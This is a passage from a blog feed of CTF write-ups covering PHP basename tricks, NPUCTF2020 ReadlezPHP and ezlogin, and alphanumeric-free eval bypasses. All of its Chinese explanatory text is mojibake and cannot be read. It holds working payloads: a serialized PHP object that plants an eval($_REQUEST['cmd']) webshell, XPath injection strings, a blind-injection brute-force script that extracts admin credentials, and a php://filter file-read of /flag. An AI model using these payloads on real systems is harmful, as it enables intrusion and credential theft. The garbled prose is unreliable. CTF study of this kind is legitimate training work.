<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">'/config\.php\/*$/i'</span>, $str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">255</span>;$i++)&#123;</span><br><span class="line">    $str=<span class="string">"/index.php/config.php/"</span>.chr($i);</span><br><span class="line">    <span class="keyword">if</span>(!check($str))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $i.<span class="string">"ï¼š"</span>.basename($str);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>Payload2</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">http</div></div><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http://xxx.com/index.php/config.php/%80?source</span></span><br></pre></td></tr></table></figure></div>

<p>å‚è€ƒå¾ˆå¤šå¤§ä½¬çš„æ€è·¯<br><a href="https://blog.csdn.net/qq_58784379/article/details/121742710" target="_blank" rel="noopener">sGanYu(Zer0pts2020)basenameå‡½æ•°æ¼æ´</a><br><a href="https://blog.csdn.net/rfrder/article/details/110929280" target="_blank" rel="noopener">bfengj(Zer0pts2020)Can you guess it?çš„WP</a></p>
<hr>
<h1 id="å¨é€¼å‡ å¥"><a href="#å¨é€¼å‡ å¥" class="headerlink" title="å¨é€¼å‡ å¥"></a>å¨é€¼å‡ å¥</h1><p>å¾ˆä¹…æ²¡åšé¢˜äº†ï¼Œæ‘¸äº†å¤ªä¹…äº†ï¼Œçš„ç¡®è‡ªå·±ç”Ÿç–äº†å¾ˆå¤šï¼Œ2021å¹´ç¡®å®å¾ˆå¤šäº‹æƒ…ä¸æ€ä¹ˆé¡ºï¼Œå¸Œæœ›æ–°çš„ä¸€å¹´èƒ½å¥½ä¸€äº›å§</p>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Ha1cyonCTF2020-å…¬å¼€èµ›</title>
    <url>/yakko117/2020/04/18/NPUCTF2020/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>å¤ç°å­¦ä¹ ï¼Œè¿˜æ˜¯å­¦ä¹ åˆ°å¾ˆå¤šä¸œè¥¿çš„</p>
<h1 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020] ReadlezPHP"></a>[NPUCTF2020] ReadlezPHP</h1><p>F12 æºç çœ‹åˆ° <code>/time.php?source</code><br>ç®€å•çš„é“¾å­ï¼Œåºåˆ—åŒ–å¯¹è±¡ <code>assert</code> ä¼ é©¬</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">"Y-m-d h:i:s"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">"date"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $a = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        $b = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$h = <span class="keyword">new</span> HelloPhp;</span><br><span class="line">$h-&gt;a = <span class="string">'file_put_contents("yakko.php", "&lt;?php eval(\$_REQUEST[\'cmd\']); ?&gt;")'</span>;</span><br><span class="line">$h-&gt;b = <span class="string">"assert"</span>;</span><br><span class="line"><span class="comment">//eval($h-&gt;a);</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($h));</span><br><span class="line">@$ppp = unserialize(serialize($h));</span><br></pre></td></tr></table></figure></div>

<p>Payload:<br><code>time.php?O%3A8%3A%22HelloPhp%22%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A67%3A%22file_put_contents%28%22yakko.php%22%2C+%22%3C%3Fphp+eval%28%5C%24_REQUEST%5B%27cmd%27%5D%29%3B+%3F%3E%22%29%22%3Bs%3A1%3A%22b%22%3Bs%3A6%3A%22assert%22%3B%7D</code></p>
<p>ç„¶åèšå‰‘ ç»•è¿‡ <code>disable_fuction</code>, Payload <code>echo $FLAG</code></p>
<hr>
<h1 id="NPUCTF2020-ezlogin"><a href="#NPUCTF2020-ezlogin" class="headerlink" title="[NPUCTF2020] ezlogin"></a>[NPUCTF2020] ezlogin</h1><p><a href="https://www.cnblogs.com/W4nder/p/12747742.html" target="_blank" rel="noopener">https://www.cnblogs.com/W4nder/p/12747742.html</a><br><a href="https://shimo.im/docs/6hyIjGkLoRc43JRs/read" target="_blank" rel="noopener">https://shimo.im/docs/6hyIjGkLoRc43JRs/read</a></p>
<p>ç™»é™†é¡µé¢å¦‚ä¸‹<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ha1cyon_login_1.png" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ha1cyon_login_1.png" class="lazyload" title></a></p>
<p>æŸ¥çœ‹æºç ï¼Œåœ¨ <code>static/main.js</code> å‘ç°å…³é”®ç‚¹</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doLogin</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">var</span> username = $(<span class="string">"#username"</span>).val();</span><br><span class="line">  <span class="keyword">var</span> password = $(<span class="string">"#password"</span>).val();</span><br><span class="line">  <span class="keyword">var</span> token = $(<span class="string">"#token"</span>).val();</span><br><span class="line">  <span class="keyword">if</span>(username == <span class="string">""</span> || password == <span class="string">""</span>)&#123;</span><br><span class="line">    $(<span class="string">".msg"</span>).text(<span class="string">"ç”¨æˆ·åå’Œå¯†ç ä¸èƒ½ä¸ºç©º!"</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">var</span> data = <span class="string">"&lt;username&gt;"</span>+username+<span class="string">"&lt;/username&gt;"</span>+<span class="string">"&lt;password&gt;"</span>+password+<span class="string">"&lt;/password&gt;"</span>+<span class="string">"&lt;token&gt;"</span>+token+<span class="string">"&lt;/token&gt;"</span>; </span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: <span class="string">"POST"</span>,</span><br><span class="line">        url: <span class="string">"login.php"</span>,</span><br><span class="line">        contentType: <span class="string">"application/xml"</span>,</span><br><span class="line">        data: data,</span><br><span class="line">        anysc: <span class="keyword">false</span>,</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span> <span class="params">(result, status, xhr)</span> </span>&#123;</span><br><span class="line">          <span class="keyword">if</span>(result == <span class="string">'æˆåŠŸ'</span>)&#123;</span><br><span class="line">            window.location.href = <span class="string">'admin.php'</span>;  </span><br><span class="line">          &#125;</span><br><span class="line">          $(<span class="string">".msg"</span>).text(result);</span><br><span class="line">          </span><br><span class="line">        &#125;,</span><br><span class="line">        error: <span class="function"><span class="keyword">function</span> <span class="params">(XMLHttpRequest,textStatus,errorThrown)</span> </span>&#123;</span><br><span class="line">            $(<span class="string">".msg"</span>).text(errorThrown + <span class="string">':'</span> + textStatus);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>çœ‹åˆ°ç†Ÿæ‚‰çš„xmlï¼Œä¸€å¼€å§‹ä»¥ä¸ºæ˜¯XXEï¼Œï¼ˆç„¶åç«™è¢«æ—¥äº† = =<br>åæ¥å¤ç°çš„æ—¶å€™ï¼ŒçŸ¥é“æ˜¯ <a href="https://www.cnblogs.com/backlion/p/8554749.html" target="_blank" rel="noopener">Xpathæ³¨å…¥</a></p>
<h2 id="æ³¨å…¥ä¸ç»•è¿‡"><a href="#æ³¨å…¥ä¸ç»•è¿‡" class="headerlink" title="æ³¨å…¥ä¸ç»•è¿‡"></a>æ³¨å…¥ä¸ç»•è¿‡</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$query = "/root/accounts/user[username/text()='".$name."' and password/text()='".$pwd."']";</span><br><span class="line"></span><br><span class="line">1.ä¸‡èƒ½å¯†ç ï¼Œè¿™ç‚¹å’ŒSQLå¾ˆåƒï¼›åœ¨çŸ¥é“ç”¨æˆ·åçš„æƒ…å†µï¼š</span><br><span class="line">?name=admin' or '1'='1&amp;pwd=fake</span><br><span class="line"></span><br><span class="line">åœ¨ä¸çŸ¥é“ç”¨æˆ·åçš„æƒ…å†µï¼Œä½¿ç”¨ä¸¤ä¸ªorç»•è¿‡ï¼š</span><br><span class="line">?name=fake' or '1'or'1&amp;pwd=fake</span><br><span class="line"></span><br><span class="line">2.ä½¿ç”¨|æ“ä½œç¬¦ï¼Œ</span><br><span class="line">?name=1']|/<span class="comment">/*|ss['&amp;pwd=fake</span></span><br></pre></td></tr></table></figure></div>

<p>å…¶æ‰§è¡Œçš„è¯­å¥ä¸ºï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">/root/accounts/user[username/text()='1' ]|/<span class="comment">/*|ss['' and password/text()='1']</span></span><br></pre></td></tr></table></figure></div>

<p>å³å…ˆé—­åˆå‰é¢çš„è¯­å¥ï¼Œä¹‹ååˆ—å‡ºæ–‡æ¡£æ‰€æœ‰å…ƒç´ </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">3.ç›²æ³¨ï¼Œéœ€è¦ä¸€çº§ä¸€çº§çŒœè§£èŠ‚ç‚¹ï¼›çŒœè§£ç¬¬ä¸€çº§èŠ‚ç‚¹ï¼š</span><br><span class="line">?name=1' or substring(name(<span class="comment">/*[position()=1]),1,1)='r' or '1'='1&amp;pwd=fake</span></span><br></pre></td></tr></table></figure></div>

<p>ç„¶åæ˜¯æ³¨å…¥</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">çŒœè§£ç¬¬äºŒçº§èŠ‚ç‚¹æ•°é‡ï¼š</span><br><span class="line">?name=1' or count(/root<span class="comment">/*)=2 or '1'='1&amp;fake</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">çŒœè§£ç¬¬äºŒçº§èŠ‚ç‚¹ï¼š</span></span><br><span class="line"><span class="comment">?name=1' or substring(name(/root/*[position()=1]),1,1)='u' or '1'='1&amp;pwd=fake</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">çŒœè§£idä¸º1çš„userèŠ‚ç‚¹ä¸‹çš„usernameå€¼ï¼š</span></span><br><span class="line"><span class="comment">?name=1' or substring(/root/users/user[id=1]/username,1,1)='a' or '1'='1&amp;pwd=fake</span></span><br></pre></td></tr></table></figure></div>
<h2 id="å¤§ä½¬çš„exp"><a href="#å¤§ä½¬çš„exp" class="headerlink" title="å¤§ä½¬çš„exp"></a>å¤§ä½¬çš„exp</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://buuoj-test.cn/'</span></span><br><span class="line">sess=requests.session()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">token</span><span class="params">()</span>:</span></span><br><span class="line">    req=sess.get(url)</span><br><span class="line">    tok=re.findall(<span class="string">'&lt;input type="hidden" id="token" value="(.*)" /&gt;'</span>,req.text)</span><br><span class="line">    <span class="keyword">return</span> tok[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(username,password)</span>:</span></span><br><span class="line">    data=<span class="string">'''</span></span><br><span class="line"><span class="string">&lt;username&gt;&#123;&#125;&lt;/username&gt;&lt;password&gt;&#123;&#125;&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;</span></span><br><span class="line"><span class="string">'''</span>.format(username,password,token())</span><br><span class="line"></span><br><span class="line">    req=sess.post(url+<span class="string">'login.php'</span>,data=data,headers = &#123;<span class="string">'Content-Type'</span>: <span class="string">'application/xml'</span>&#125;)</span><br><span class="line">    print(req.text,req.status_code)</span><br><span class="line">    <span class="keyword">return</span> req</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># root</span></span><br><span class="line">payload=<span class="string">"' or  substring(name(/*[position()=1]),&#123;&#125;,1)='&#123;&#125;'  or '1' = '1"</span></span><br><span class="line">ro=<span class="string">'root'</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"' or substring(name(/root/*[position()=1]),&#123;&#125;,1)='&#123;&#125;'  or '1' = '1"</span></span><br><span class="line">ro=<span class="string">'accounts'</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"' or substring(name(/root/accounts/*[position()=1]),&#123;&#125;,1)='&#123;&#125;'  or '1' = '1"</span></span><br><span class="line">ro=<span class="string">'user'</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"' or substring(name(/root/accounts/user/*[position()=2]),&#123;&#125;,1)='&#123;&#125;'  or '1' = '1"</span></span><br><span class="line"><span class="comment"># id username password</span></span><br><span class="line">ro=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"1' or substring(/root/accounts/user[id=2]/username,&#123;&#125;,1)='&#123;&#125;' or '1'='1"</span></span><br><span class="line"><span class="comment"># guest adm1n</span></span><br><span class="line">ro=<span class="string">''</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"1' or substring(/root/accounts/user[id=2]/password,&#123;&#125;,1)='&#123;&#125;' or '1'='1"</span></span><br><span class="line"><span class="comment">#cf7414b5bdb2e65ee43083f4ddbc4d9f gtfly123</span></span><br><span class="line">ro=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string.digits+string.ascii_letters+<span class="string">'*'</span>:</span><br><span class="line">        <span class="keyword">if</span> j==<span class="string">'*'</span>:</span><br><span class="line">            print(<span class="string">'***************false'</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        tmp=payload.format(i,j)</span><br><span class="line"></span><br><span class="line">        req=login(tmp,<span class="string">'ad'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'éæ³•æ“ä½œ'</span> <span class="keyword">in</span> req.text:</span><br><span class="line">            ro+=j</span><br><span class="line">            print(ro)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>
<hr>
<p>å¾—åˆ° <code>adm1n cf7414b5bdb2e65ee43083f4ddbc4d9f</code><br>md5è§£å¯† gtfly123</p>
<p>ç™»é™†æˆåŠŸåï¼Œçœ‹åˆ°URLä¸º <code>admin.php?file=welcome</code><br>æŸ¥çœ‹æºç ï¼Œçœ‹åˆ°æœ‰ <code>base64</code> åŠ å¯†åçš„ <code>flag is in /flag</code><br>è¯´æ˜è¿˜è€ƒæŸ¥æ–‡ä»¶åŒ…å«ï¼Œç”¨ä¼ªåè®®æ‰“ï¼Œæµ‹äº†ä¸€ä¸‹ï¼Œå¤§æ¦‚æœ‰å‡ ä¸ªè¿‡æ»¤ <code>php read base64</code><br>ä¹Ÿè¿˜æ˜¯ç®€å•ï¼Œå¤§å°å†™ç»•è¿‡</p>
<p><code>/admin.php?file=Php://filter/Read=convert.Base64-encode/resource=/flag</code></p>
<hr>
<p>åé¢çš„ä¸€äº›é¢˜ç›®å…ˆæ‘¸äº†ï¼Œæœ‰ç©ºå†æ¥çœ‹äº†</p>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>æ— æ•°å­—å­—æ¯ç»•è¿‡ Bypass</title>
    <url>/yakko117/2020/04/16/%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E7%BB%95%E8%BF%87webshell/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>å¾ˆä¹…ä»¥å‰åšè¿‡å®‰æ’çš„é¢˜ï¼Œæœ€è¿‘é‡åˆ°ä¸ªå·®ä¸å¤šï¼Œæ¥è®°å½•ä¸€ä¸‹å­¦ä¹ ç¬”è®°<br>åˆ©ç”¨æ€è·¯æå‡ºæ¥è‡ªPç¥<a href="https://www.leavesongs.com/penetration/webshell-without-alphanum.html" target="_blank" rel="noopener">ä¸€äº›ä¸åŒ…å«æ•°å­—å’Œå­—æ¯çš„ webshell</a></p>
<h1 id="æ¼æ´æ ¸å¿ƒ"><a href="#æ¼æ´æ ¸å¿ƒ" class="headerlink" title="æ¼æ´æ ¸å¿ƒ"></a>æ¼æ´æ ¸å¿ƒ</h1><ul>
<li>å¼‚æˆ–ç»•è¿‡ Bypass</li>
<li>å–åç»•è¿‡</li>
<li>ä¸ç”¨æ•°å­—æ„é€ å‡ºæ•°å­—( å¼±ç±»å‹ <code>true å€¼ä¸º 1</code> -&gt; <code>true + true == 2</code> )</li>
</ul>
<h1 id="å®‰æ’çš„é¢˜å‹å’Œå˜ç§"><a href="#å®‰æ’çš„é¢˜å‹å’Œå˜ç§" class="headerlink" title="å®‰æ’çš„é¢˜å‹å’Œå˜ç§"></a>å®‰æ’çš„é¢˜å‹å’Œå˜ç§</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Long."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9]+/"</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$hint =  "php function getFlag() to get flag";</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">35</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Long."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9_$]+/"</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$hint =  "php function getFlag() to get flag";</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>å…·ä½“å‚çœ‹ <a href="https://www.freebuf.com/articles/web/186298.html" target="_blank" rel="noopener">Pç¥çš„æ–‡ç« </a><br>ä»¥åŠ <a href="https://www.smi1e.top/php%e4%b8%8d%e4%bd%bf%e7%94%a8%e6%95%b0%e5%ad%97%e5%ad%97%e6%af%8d%e5%92%8c%e4%b8%8b%e5%88%92%e7%ba%bf%e5%86%99shell/" target="_blank" rel="noopener">å¾®ç¬‘å¸ˆå‚…çš„è¡ç”Ÿæ“ä½œ</a></p>
<h1 id="ISITDTU-CTF-2019-EasyPHP"><a href="#ISITDTU-CTF-2019-EasyPHP" class="headerlink" title="ISITDTU CTF 2019 EasyPHP"></a>ISITDTU CTF 2019 EasyPHP</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">$_ = @$_GET[<span class="string">'_'</span>];</span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">'/[\x00- 0-9\'"`$&amp;.,|[&#123;_defgops\x7F]+/i'</span>, $_) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'rosÃ© will not do it'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( strlen(count_chars(strtolower($_), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'you are so close, omg'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($_);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>æœ‰ç‚¹ç±»ä¼¼ä»¥å‰å†™çš„å›½èµ›çš„ <a href="https://www.suk1.top/2019/05/16/love_math/" target="_blank" rel="noopener">love_math</a></p>
<p>æ­£åˆ™åŒ¹é…äº†ä¸€äº›å­—æ¯å’Œæ•°å­—è¿˜æœ‰ä¸€äº›ç‰¹æ®Šç¬¦å·ã€‚ å…·ä½“è°ƒè¯•æ­£åˆ™ è¿™é‡Œæœ‰ä¸ª<a href="https://regex101.com/" target="_blank" rel="noopener">å·¥å…·ç½‘ç«™</a></p>
<p>æ­£åˆ™çš„æ„æ€æ˜¯åŒ¹é… <code>\x00</code> åˆ° <code>ç©ºæ ¼(\x20)</code> çš„å­—ç¬¦ï¼Œ <code>0åˆ°9</code> çš„æ•°å­—ã€<code>&quot;$&amp;.,|[{_defgops</code> ä»¥åŠ <code>DELï¼ˆ\x7fï¼‰</code> å­—ç¬¦ã€‚å¦‚æœä½ æäº¤çš„å­—ç¬¦ä¸²å‡ºç°ä¸Šè¿°å­—ç¬¦ï¼Œdieã€‚</p>
<p>ç¬¬äºŒä¸ª<code>strlen(count_chars(strtolower($_), 0x3)) &gt; 0xd</code><br>è¡¨ç¤ºæˆ‘ä»¬æäº¤çš„å­—ç¬¦ä¸²ä¸€å…±ä¸èƒ½å‡ºç°å¤šäº <strong>13ç§ä¸åŒçš„å­—ç¬¦</strong>ã€‚</p>
<p>å…è®¸å‡ºç°çš„å­—ç¬¦å¦‚ä¸‹ï¼š<code>!#%()*+-/:;&lt;=&gt;?</code><br><code>@ABCHIJKLMNQRTUVWXYZ\]^abchijklmnqrtuvwxyz}~</code></p>
<h2 id="test-php"><a href="#test-php" class="headerlink" title="test.php"></a>test.php</h2><p>çœ‹ä¸€ä¸‹å†…ç½®å‡½æ•°è¿˜æœ‰å“ªäº›èƒ½ç”¨</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$array=get_defined_functions();</span><br><span class="line"><span class="keyword">foreach</span>($array[<span class="string">'internal'</span>] <span class="keyword">as</span> $arr)&#123;</span><br><span class="line">    <span class="keyword">if</span> ( preg_match(<span class="string">'/[\x00- 0-9\'"\`$&amp;.,|[&#123;_defgops\x7F]+/i'</span>, $arr) ) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> ( strlen(count_chars(strtolower($arr), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> ) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">print</span>($arr.<span class="string">'&lt;br/&gt;'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">bcmul, rtrim, trim, ltrim</span><br><span class="line">chr, link, unlink, tan</span><br><span class="line">atan, atanh, tanh, intval</span><br><span class="line">mail, min, max</span><br></pre></td></tr></table></figure></div>

<p>è™½ç„¶å¼•å·éƒ½è¢«è¿‡æ»¤äº†ï¼Œä½†æ˜¯PHPé»˜è®¤ä¼šæŠŠæ²¡æœ‰åŠ å¼•å·çš„å­—ç¬¦ä¸²å½“æˆå¸¸é‡å¤„ç†ï¼Œæ‰¾ä¸åˆ°å¯¹åº”å¸¸é‡å°±ä¼šå°†å…¶è§£é‡Šæˆå­—ç¬¦ä¸²ï¼Œå› æ­¤æ²¡æœ‰å¼•å·ä¸æ˜¯é™åˆ¶ã€‚</p>
<p>è€Œä¸”PHPè°ƒç”¨å‡½æ•°ï¼Œå¯ä»¥ä½¿ç”¨å­—ç¬¦ä¸²è°ƒç”¨ã€‚è¿™ä¸ªåœ¨å½“åˆ <a href="https://www.suk1.top/2020/02/05/GXY%E5%A5%97%E5%A8%83/" target="_blank" rel="noopener">GXYç¦æ­¢å¥—å¨ƒ</a> æœ‰æåˆ°è¿‡</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/limit_webshell_1.png" data-fancybox="group" data-caption="limit_webshell_1" class="fancybox"><img alt="limit_webshell_1" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/limit_webshell_1.png" class="lazyload" title="limit_webshell_1"></a></p>
<p>æ³¨æ„åˆ° <code>^</code> ç¬¦å·æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡å¯¹å­—ç¬¦ä¸²è¿›è¡Œè¿ç®—æ¥è§„é¿ifäº†ã€‚</p>
<p>åé¢å°±æ˜¯å¸¸è§„çš„å¼‚æˆ–è§£é¢˜</p>
